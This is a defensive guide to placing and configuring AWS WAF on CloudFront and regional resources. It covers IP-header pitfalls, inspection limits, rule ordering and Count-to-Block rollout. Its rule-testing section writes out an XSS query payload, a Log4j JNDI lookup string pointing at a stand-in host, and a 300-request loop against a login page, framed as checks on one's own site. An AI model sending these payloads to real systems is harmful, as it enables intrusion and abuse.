# AWS WAF: where to put it and how to set it up

Where to place AWS WAF (at the edge on CloudFront, or in the region on an ALB and similar), how to combine the two, and how to order and roll out rules. The diagrams from the original Japanese article are redrawn here in English.

## TL;DR

- WAF **inspects the content of requests that arrive**. VPC origins, OAC and security groups **restrict which paths can reach the origin**. They are different layers, and one doesn't replace the other.
- For a public web app, AWS recommends putting WAF on **CloudFront (the edge)** unless something prevents it. Add a regional WAF (on the ALB and so on) only when you need it.
- A WAF on the ALB sees **CloudFront's IP**, not the client's. Keep IP-based rules on the edge WAF.
- Body inspection limit: **ALB is fixed at 8 KB**; **CloudFront defaults to 16 KB (up to 64 KB)**.
- Order rules as a **funnel** that removes attacks early, and test in **Count** mode before switching to **Block**.

## How AWS WAF evolved

AWS WAF launched in October 2015 for CloudFront only. ALB support came in December 2016. That's one reason older environments often have WAF attached only to CloudFront.

| When | What happened |
|---|---|
| Oct 2015 | AWS WAF launches, CloudFront only |
| Dec 2016 | ALB support |
| Jun 2017 | Rate-based rules |
| Nov 2018 | API Gateway support. Before this you had to put your own CloudFront in front |
| Nov 2019 | The new AWS WAF (wafv2 API) and AWS Managed Rules. WCU (capacity units) introduced; the old version becomes "AWS WAF Classic" |
| Nov 2020 | ALB setting for what happens when WAF is unavailable (`waf.fail_open.enabled`) |
| Apr 2021 | Bot Control, labels, scope-down statements |
| Feb 2024 | One-click WAF from the ALB console |
| Jun 2025 | Anti-DDoS managed rule group |
| Sep 2025 | AWS WAF Classic support ends |

## Where WAF sits among the defence layers

VPC origins, OAC and security groups decide **who can reach the origin (the path)**. WAF is a different layer: it **inspects the content of the requests that do arrive**.

**Diagram 1: defence layers and where WAF sits, in request order**
Legend: WAF layers inspect content · path layers restrict the route · L3/L4 layer absorbs volume · `[? … ?]` = optional.

```
 ┌──────┐
 │ User │
 └──┬───┘
    ▼
 ┌─ EDGE (CloudFront / Global Accelerator) ────────────────────────────────────────────┐
 │  A. Absorb L3/L4                          B. WAF (Global)  ★ the main battleground   │
 │     Stops: floods, SYN floods,     ───►      Stops: attack patterns, HTTP floods,     │
 │            bad TCP/TLS                              bots, bad IPs                     │
 │     Uses:  Shield Standard (auto),           Uses:  AWS WAF (CloudFront scope,        │
 │            CloudFront, GA                           created in us-east-1)             │
 └──────────────────────────────────────────────────┬──────────────────────────────────┘
                                                    ▼
 ┌─ C. Restrict the path ───────────────────────────────────────────────────────────────┐
 │  Stops: direct access to the origin that goes around WAF                              │◄┄┄┄┄┐
 │  Uses:  VPC origin / OAC / secret header                                              │ ✕   ┊
 └──────────────────────────────────────────────────┬──────────────────────────────────┘     ┊
                                                    ▼                                         ┊
 ┌─ REGION (inside the VPC) ────────────────────────────────────────────────────────────┐     ┊
 │  D. SG / NACL                  [? E. WAF (Regional) ?]           F. Application       │     ┊
 │     Stops: anything but   ───► [? Stops: app-specific ?]  ───►     Stops: authn/authz, │     ┊
 │     allowed sources/ports      [? rules; insurance for ?]           input validation,  │     ┊
 │     Uses: security groups,     [? paths that skip the  ?]           logic flaws        │     ┊
 │     NACLs                      [? edge                 ?]           Uses: the app,     │     ┊
 │                                [? Uses: AWS WAF (ALB,  ?]           Cognito, API keys  │     ┊
 │                                [? API Gateway REST, …) ?]                              │     ┊
 └──────────────────────────────────────────────────────────────────────────────────────┘     ┊
                                                                                               ┊
 ┌─ Attacker ─────────────────────┐                                                            ┊
 │ (finds the origin from         │┄┄┄┄ ✕ goes around B, straight at the origin ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
 │ Certificate Transparency logs, │     → blocked at C (without C, B is bypassed entirely)
 │ etc.)                          │
 └────────────────────────────────┘
```

How to read it:

- **Layers that inspect content (B, E):** WAF. They look at the content, rate and source of requests that arrive.
- **Layers that restrict the path (C, D):** they don't look at content. They decide who can reach the origin at all.
- **B only (WAF only):** anyone who goes straight to the origin passes untouched. This is what "bypassing WAF through someone else's CloudFront" refers to.
- **C and D only (path only):** SQL injection or HTTP floods coming through your real CloudFront aren't stopped.
- **The baseline is A + B + C + D.** A (Shield Standard) applies automatically when you use CloudFront or Global Accelerator. Add **E** when there's a path that skips the edge, when you want app-specific rules kept separate, or when there's no CloudFront at all (patterns ⑦ and ⑧ below).

## Where WAF can and can't be attached

A web ACL can be associated with CloudFront, ALB, API Gateway REST APIs, AppSync, Cognito user pools, App Runner, Verified Access, Amplify and Bedrock AgentCore Gateway.

- For CloudFront the web ACL is **Global scope**, created in **us-east-1**.
- For ALB, API Gateway and the others it's **Regional scope**, in the **same region as the resource**.
- A web ACL associated with CloudFront can't be associated with any other kind of resource.

WAF **can't** be attached directly to NLB, Global Accelerator, S3, Lambda function URLs, Lambda Web Functions or API Gateway **HTTP** APIs. To protect them, put CloudFront in front, or attach WAF to an ALB behind them.

**Diagram 2: where AWS WAF can and can't be attached**

```
┌─ Global scope (us-east-1) ─────┐ ┌─ Regional scope (same region as the resource) ─────────────────┐ ┌─ Can't attach directly ─────────────────────────┐
│                                │ │                                                                  │ │                                                  │
│   CloudFront   AWS WAF (Global)│ │   ALB            API Gateway REST API   AppSync   Cognito user   │ │   NLB          Global Accelerator   S3           │
│                                │ │                                                   pools          │ │                                                  │
│                                │ │   App Runner     Verified Access        Amplify   AgentCore      │ │   Lambda       API Gateway          Lambda Web   │
│  A web ACL associated with     │ │                                                   Gateway        │ │   function URL HTTP API             Functions    │
│  CloudFront can't be used for  │ │                                                                  │ │                                                  │
│  any other kind of resource    │ │  Body inspection limit: ALB / AppSync fixed at 8 KB;             │ │ → put CloudFront in front                       │
│                                │ │  everything else 16 KB by default (max 64 KB)                    │ │   (S3, function URLs, Web Functions, HTTP API)  │
│                                │ │                                                                  │ │ → attach to an ALB behind it (NLB, GA)          │
└────────────────────────────────┘ └──────────────────────────────────────────────────────────────────┘ └──────────────────────────────────────────────────┘
```

How to read it:

- For a public web app, the default is to put WAF on **CloudFront (Global)** unless something prevents it (AWS WAF implementation guidelines).
- Add a Regional WAF when you want app-specific rules kept separate, when there's a path that skips the edge, or when there's no CloudFront.
- For resources WAF can't attach to, route traffic through something it can attach to.

## Putting it on the edge (CloudFront) is the default

AWS's WAF implementation guidelines recommend that internet-facing web apps put WAF together with CloudFront unless something prevents it.

**Diagram 3: why WAF goes on the edge (CloudFront)**
Legend: thick arrow = high volume · ✕ = rejected · `[? … ?]` = optional.

```
 Lots of requests,
 some of them attacks
        ┃
        ┃  (thick = high volume)
        ▼
 ┌─ EDGE ──────────────────────────────────────────────────┐
 │  CloudFront  ━━━━━━━━━━━━━━━━━━━━━━━━━►  AWS WAF (Global) │
 │      malformed HTTP and L3/L4 attacks         │          │
 │      are dropped by CloudFront first          │          │
 │  Shield Standard                              │          │
 └───────────────────────────────────────────────┼──────────┘
                                                 │ ✕ ──► ┌─ Rejected (403) ─────────────────────────┐
                                                 │       │ no CloudFront request or data-transfer    │
                 only requests that passed       │       │ charges for it                            │
                 inspection                      ▼       └───────────────────────────────────────────┘
 ┌─ REGION (inside the VPC) ───────────────────────────────────────────────┐
 │  ALB  ───►  [? AWS WAF (Regional), if needed ?]  ───►  App              │
 └─────────────────────────────────────────────────────────────────────────┘
```

Benefits of the edge (AWS WAF implementation guidelines, DDoS resiliency whitepaper):

- WAF capacity on CloudFront scales with the size of CloudFront's edge network, and isn't limited by regional WAF capacity.
- CloudFront itself stops malformed HTTP and L3/L4 attacks first, so WAF can concentrate on application-layer inspection.
- Requests rejected by CloudFront or WAF don't incur CloudFront request or data-transfer charges (WAF inspection is still billed). They never reach the ALB, so they cost no ALB LCUs and put no load on the app.

Add a **regional WAF (E)** when:

- One domain fronts several apps, and you want shared IP and country blocks at the edge with app-specific rules on each ALB (the guidelines have an example of this).
- A path that skips the edge still exists in theory, as with pattern ② (a public ALB), so the regional WAF acts as insurance.
- There's no CloudFront at all, as with ⑦ (Global Accelerator) or ⑧ (a public ALB taking traffic directly). Then the ALB's WAF is the only WAF.

## Where WAF goes in each architecture pattern

The patterns ①–⑨ are explained in the author's companion article (see Sources).

| Pattern | Where WAF goes | Notes |
|---|---|---|
| ① VPC origin | CloudFront (Global) | The path is closed, so the ALB usually doesn't need one. Add one on the ALB only to keep app-specific rules separate |
| ② Public ALB + secret header | CloudFront (Global), plus ALB (Regional) if needed | Consider the ALB WAF as insurance in case the secret header leaks |
| ③ S3 (OAC) | CloudFront (Global) | Can't attach to S3 |
| ④ Lambda function URL (OAC) | CloudFront (Global) | Can't attach to function URLs |
| ⑤ Regional API Gateway | CloudFront (Global), plus the REST API stage (Regional) if needed | Can't attach to HTTP APIs |
| ⑥ Private API | CloudFront (Global) | Same path as ① |
| ⑦ Global Accelerator | ALB (Regional) | Can't attach to GA. The client IP is preserved, so IP-based rules work as they are |
| ⑧ Public ALB taking traffic directly | ALB (Regional), **required** | The only L7 defence. Consider Shield Advanced too |
| ⑨ Lambda Web Functions (OAC) | CloudFront (Global) | Can't attach to the endpoint |

## Things to watch when combining edge and regional WAF

### 1. The ALB's WAF sees CloudFront's IP, not the client's

From an ALB behind CloudFront, the peer is CloudFront, not the user. By default WAF judges by that connection's source IP, so **everyone looks like a CloudFront IP**. To use IP sets, geo (country) rules or rate-based rules on the ALB's WAF, you have to configure **forwarded IP**, which reads `X-Forwarded-For` or another header.

Two catches:

- If the configured header is missing from a request, WAF **doesn't apply the rule at all**.
- WAF uses the **first** IP in the header. If the client sends its own `X-Forwarded-For`, CloudFront **appends** the connecting IP to the end and forwards it. So the first value the ALB sees is something the client can set to anything.

The Bot Control and Anti-DDoS managed rule groups recognise traffic coming through CDNs such as CloudFront, and use the original client IP automatically.

**Conclusion: keep IP-based rules on the edge (CloudFront) WAF.**

**Diagram 4: the IP the ALB's WAF sees, and the X-Forwarded-For trap**
The attacker can send their own `X-Forwarded-For`. CloudFront appends the connecting IP to the end of it.

```
 Attacker                    X-Forwarded-For: 203.0.113.10 (forged)        X-Forwarded-For: 203.0.113.10, 198.51.100.7
 (real IP: 198.51.100.7) ─────────────────────────────────────► CloudFront ──────────────────────────────────────────────► ALB
                                                                    ┊         source IP: CloudFront's IP                    ┊
                                                                    ┊                                                       ┊
                                                              WAF (Global)                                            WAF (Regional)

  ┌─ Edge WAF ─────────────────────────────┐       ┌─ ALB's WAF (default) ────────────────────────────┐
  │ source IP = 198.51.100.7               │       │ source IP = CloudFront's IP                      │
  │ → IP, country and rate rules work      │       │ → everyone appears to come from the same range   │
  │   correctly                            │       └──────────────────────────────────────────────────┘
  └────────────────────────────────────────┘       ┌─ ALB's WAF (forwarded IP configured) ────────────┐
                                                    │ first IP in the header = 203.0.113.10           │
                                                    │ → judged on a value the attacker wrote           │
                                                    │ if the header is missing, the rule isn't applied │
                                                    └──────────────────────────────────────────────────┘
```

- Put IP-set, geo and rate-based rules on the **edge (CloudFront) WAF**.
- The Bot Control and Anti-DDoS managed rule groups recognise CDN traffic and use the original client IP.

### 2. The body size WAF can inspect depends on where it is

| Where | Body inspection limit |
|---|---|
| ALB / AppSync | **8 KB, fixed** |
| CloudFront / API Gateway / Cognito / App Runner / Verified Access | 16 KB by default, can be raised to 64 KB (extra cost) |

Anything past the limit isn't passed to WAF and isn't inspected. Also, the Core rule set's `SizeRestrictions_BODY` rule **blocks bodies over 8 KB**, which causes false positives on file-upload APIs and similar. Use labels to make an exception.

### 3. What happens when WAF has an internal error depends on where it is

If WAF hits an internal error and can't decide in time, CloudFront usually **lets the request through**, and regional services usually **reject it**. The edge WAF leans fail-open, the ALB's leans fail-closed. The ALB also has the `waf.fail_open.enabled` attribute (default `false`).

**Diagram 5: behaviour when WAF can't decide depends on where it is**
The default behaviour when an internal WAF error delays the decision:

```
 Request ───► CloudFront ───► WAF error ───────────────► ┌─ Let through (leans to availability, fail-open) ─┐
                                                          └──────────────────────────────────────────────────┘

 Request ───► ALB, etc.  ───► WAF error ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄► ┌─ Reject (leans fail-closed) ─────────────────────┐
                                                          │ ALB: changeable with waf.fail_open.enabled       │
                                                          │ (default false)                                   │
                                                          └──────────────────────────────────────────────────┘
```

The edge WAF prioritises **not stopping** traffic; the regional WAF prioritises **not letting it through**. Because there can be moments when the edge WAF can't decide, don't make WAF your only defence: keep authentication and input validation in the app.

## How to order the rules

The DDoS resiliency whitepaper recommends a **funnel** that cuts attacks down early. Rules at the top are cheap to evaluate; rules lower down look at the content in more detail.

**Diagram 6: order rules as a funnel**
Cheaper checks at the top remove attacks early; lower rules inspect content in detail (order recommended by the DDoS resiliency whitepaper).

```
 ┌──────────────────────────────────────────────────────────────┐ ┐
 │ 1. Allowed IPs (Allow)                                       │ │
 └┬────────────────────────────────────────────────────────────┬┘ │
  │ 2. Blocked IPs (Block)                                     │   ├─ judged by source (cheap)
  └┬──────────────────────────────────────────────────────────┬┘   │
   │ 3. Country restrictions (geo)                            │    │
   └┬────────────────────────────────────────────────────────┬┘    ┘
    │ 4. Anti-DDoS managed rules                             │     ┐
    └┬──────────────────────────────────────────────────────┬┘     ├─ DDoS and reputation
     │ 5. Amazon IP reputation list                         │      │
     └┬────────────────────────────────────────────────────┬┘      ┘
      │ 6. Global rate-based rule (higher threshold)        │       ┐
      └┬──────────────────────────────────────────────────┬┘       ├─ judged by volume
       │ 7. Targeted rate-based rules (API, URI, JA3/JA4,  │        │
       │    … lower thresholds)                            │        │
       └┬────────────────────────────────────────────────┬┘        ┘
        │ 8. Core rule set                               │         ┐
        └┬──────────────────────────────────────────────┬┘         ├─ inspect content (expensive)
         │ 9. Bot Control                               │          │
         └──────────────────────────────────────────────┘          ┘
```

**First step:** start with Core rule set + Known bad inputs + Amazon IP reputation list, then add use-case-specific rule groups to fit the app. The default web ACL created by the ALB's WAF integration is exactly these three.

For rate-based rules, the recommendation is one rule with a fairly high threshold across everything. Add separate rules with lower thresholds for dynamic endpoints that can't be cached, and for expensive operations such as login.

## Operations

**Diagram 7: the path to switching a rule to Block**
Never switch straight to Block. Watch the effect in Count mode first, and go round this loop every time you add a rule.

```
 ┌─────────────────┐   ┌──────────────────┐   ┌──────────────────┐   ┌──────────────────┐   ┌──────────────┐   ┌──────────────┐
 │ ① Count mode in │──►│ ② Count mode on  │──►│ ③ Check logs and │──►│ ④ Add exceptions │──►│ ⑤ Switch to  │──►│ ⑥ Monitor    │
 │   staging       │   │   production     │   │   metrics for    │   │   (scope-down,   │   │   Block      │   │   with logs  │
 │                 │   │   traffic        │   │   false positives│   │   labels)        │   │              │   │              │
 └────────▲────────┘   └──────────────────┘   └────────▲─────────┘   └────────┬─────────┘   └──────────────┘   └──────┬───────┘
          │                                            └── false positives ───┘                                      │
          │                                                 remain                                                   │
          └───────────────────────────────────── when you add a new rule ────────────────────────────────────────────┘
```

What to watch:

- WAF logs. Sampled requests only cover the last 3 hours, so investigations need real logs.
- Count and Block numbers per rule (CloudWatch metrics, Logs Insights queries).
- For example, the Core rule set's `SizeRestrictions_BODY` blocks bodies over 8 KB, so watch for false positives on upload APIs.

In more detail:

- **Try in Count mode, then Block.** Tune in staging, then confirm the effect on production traffic in Count mode before enabling Block.
- **Turn on logging.** WAF logs are essential for investigating false positives and analysing attacks. Sampled requests (last 3 hours) are often not enough.
- **Standardise across the organisation.** AWS Firewall Manager deploys and enforces WAF policies across every account in an organisation.
- **With Shield Advanced:** associating a web ACL that contains a rate-based rule is a prerequisite. From 26 March 2026, the default HTTP-flood protection is the **Anti-DDoS managed rule group**, replacing the older automatic L7 mitigation.

## Commands for checking and testing

### Checking the configuration

```bash
# Web ACLs for CloudFront live in us-east-1 with scope CLOUDFRONT
aws wafv2 list-web-acls --scope CLOUDFRONT --region us-east-1 \
  --query 'WebACLs[].[Name,Id]' --output table

# The web ACL attached to a regional resource such as an ALB
aws wafv2 get-web-acl-for-resource --resource-arn <alb-arn> --region ap-northeast-1 \
  --query 'WebACL.Name' --output text

# Is logging configured?
aws wafv2 get-logging-configuration --resource-arn <web-acl-arn> --region us-east-1
```

### Testing that rules work

Only run these against sites you manage. Start in Count mode and check that the requests show up in metrics and logs.

```bash
URL=https://www.example.com

# Query string that looks like XSS → 403 from the Core rule set
curl -s -o /dev/null -w '%{http_code}\n' "$URL/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

# Header with a Log4j attack pattern → 403 from Known bad inputs
curl -s -o /dev/null -w '%{http_code}\n' -H 'User-Agent: ${jndi:ldap://example.com/a}' "$URL/"

# Body over 8 KB → 403 from the Core rule set's SizeRestrictions_BODY (checks for upload-API false positives)
head -c 9000 /dev/zero | tr '\0' 'a' \
  | curl -s -o /dev/null -w '%{http_code}\n' -X POST --data-binary @- "$URL/api/upload"

# Repeated requests to one URL → 403s start appearing once the rate-based threshold is exceeded
# (WAF evaluates rates about every 10 seconds, so it doesn't switch immediately)
for i in $(seq 1 300); do curl -s -o /dev/null -w '%{http_code}\n' "$URL/login"; done | sort | uniq -c
```

### Investigating in production

```bash
# IPs currently being limited by a rate-based rule (only rules that aggregate by IP or forwarded IP)
aws wafv2 get-rate-based-statement-managed-keys --scope CLOUDFRONT --region us-east-1 \
  --web-acl-name my-acl --web-acl-id <web-acl-id> --rule-name rate-limit-all

# A sample of requests that recently matched a rule (up to 3 hours back)
# date -d is GNU date syntax (on macOS use gdate or similar)
aws wafv2 get-sampled-requests --web-acl-arn <web-acl-arn> \
  --rule-metric-name AWS-AWSManagedRulesCommonRuleSet \
  --scope CLOUDFRONT --region us-east-1 --max-items 100 \
  --time-window StartTime=$(date -u -d '-1 hour' +%Y-%m-%dT%H:%M:%SZ),EndTime=$(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --query 'SampledRequests[].[Request.ClientIP,Request.URI,Action,RuleNameWithinRuleGroup]' \
  --output table
```

If WAF logs go to CloudWatch Logs, Logs Insights can count how many requests each rule blocked:

```
fields @timestamp, httpRequest.clientIp, httpRequest.uri, terminatingRuleId, action
| filter action = "BLOCK"
| stats count(*) as blocked by terminatingRuleId
| sort blocked desc
```

## Related notes

- [aws-waf-internals.md](aws-waf-internals.md): how Shield, CloudFront and WAF work underneath (packet mitigation, rule evaluation, rate estimation, tokens, managed intel)
- [kubernetes-services.md](kubernetes-services.md): how traffic reaches Pods once it's past the load balancer
- [ingress-and-gateway-api.md](ingress-and-gateway-api.md): L7 routing inside the cluster, behind an ALB

## Sources

- Original article (Japanese): anfangd, "AWS WAF、どこに置いてどう組んでいますか？ エッジとリージョンの使い分けと注意点", https://zenn.dev/anfangd/articles/aws-waf-placement
- Companion article on patterns ①–⑨: https://zenn.dev/anfangd/articles/aws-web-ingress-origin-protection
- AWS docs and whitepapers cited by the article:
  - Associating or disassociating protection with an AWS resource (AWS WAF Developer Guide)
  - AWS WAF integration design, Guidelines for Implementing AWS WAF (whitepaper)
  - AWS Best Practices for DDoS Resiliency: Amazon CloudFront; AWS WAF
  - Using forwarded IP addresses in AWS WAF
  - Request and response behavior for custom origins (CloudFront Developer Guide)
  - AWS WAF quotas
  - Baseline rule groups: Core rule set
  - Configuring protection in AWS WAF
  - AWS WAF rate-based rules
  - Integrations for your Application Load Balancer
  - Testing and tuning your AWS WAF protections
  - Automating application layer DDoS mitigation (Shield Advanced)
  - Migrating your rules from AWS WAF Classic to the new AWS WAF
  - Announcements: Introducing AWS WAF (2015); AWS WAF on the Application Load Balancer (2016); API Gateway adds AWS WAF (2018); Introducing AWS Managed Rules (2019); AWS WAF Bot Control (2021); ALB one-click WAF (2024); automatic application-layer DDoS protection (2025)
